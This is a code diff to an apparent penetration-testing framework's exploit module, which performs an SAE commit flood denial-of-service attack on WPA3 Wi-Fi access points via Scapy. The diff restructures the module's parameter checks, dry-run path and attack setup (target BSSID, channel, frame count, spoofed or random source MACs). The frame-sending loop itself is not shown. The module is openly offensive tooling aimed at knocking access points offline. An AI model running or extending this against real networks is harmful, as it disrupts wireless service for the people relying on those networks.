@@ -123,8 +123,33 @@ class Exploit(Exploit):
             print_error("Defina target_bssid no formato AA:BB:CC:DD:EE:FF.")
             return
 
+        channel = int(self.channel)
+        if channel not in range(1, 15) and channel not in range(36, 178):
+            print_error(f"Canal invalido: {channel}")
+            return
+
+        if self.dry_run:
+            print_info(
+                f"DRY RUN: SAE commit flood: iface={iface}, bssid={bssid}, channel={channel}, "
+                f"count={int(self.frame_count)}, interval={float(self.interval)}s"
+            )
+            return
+
+        print_success("Pre-conditions satisfied; launching exploit")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: SAE commit flood DoS against WPA3 AP."""
+        iface = str(self.interface).strip()
+        bssid = str(self.target_bssid).strip().upper()
+        channel = int(self.channel)
+        count = int(self.frame_count)
+        interval = float(self.interval)
+        randomize = bool(self.randomize_src)
+        fixed_src = str(self.fixed_src_mac).strip()
+
         try:
-            from scapy.all import (  # type: ignore
+            from scapy.all import (
                 Dot11,
                 Dot11Auth,
                 RadioTap,
@@ -134,34 +159,17 @@ class Exploit(Exploit):
                 conf as scapy_conf,
             )
         except ImportError:
-            print_error("Scapy não está instalado. Execute: pip install scapy")
-            return
-
-        channel = int(self.channel)
-        if channel not in range(1, 15) and channel not in range(36, 178):
-            print_error(f"Canal inválido: {channel}")
-            return
-
-        count = int(self.frame_count)
-        interval = float(self.interval)
-        randomize = bool(self.randomize_src)
-        fixed_src = str(self.fixed_src_mac).strip()
-
-        if self.dry_run:
-            print_info(
-                f"DRY RUN — SAE commit flood: iface={iface}, bssid={bssid}, channel={channel}, "
-                f"count={count}, interval={interval}s, randomize={randomize}"
-            )
+            print_error("Scapy not available. Install: pip install scapy")
             return
 
         print_status(
             "SAE Commit Flood: iface={}, alvo={}, canal={}, frames={}".format(
-                iface, bssid, channel, count if count > 0 else "contínuo"
+                iface, bssid, channel, count if count > 0 else "continuo"
             )
         )
         print_info(
             "Enviar SAE Auth commit frames (seq=1, status=0) a partir de "
-            "{} MACs.".format("MACs aleatórios" if randomize else (fixed_src or "MAC padrão"))
+            "{} MACs.".format("MACs aleatorios" if randomize else (fixed_src or "MAC padrao"))
         )
 
         self._stop_event = threading.Event()
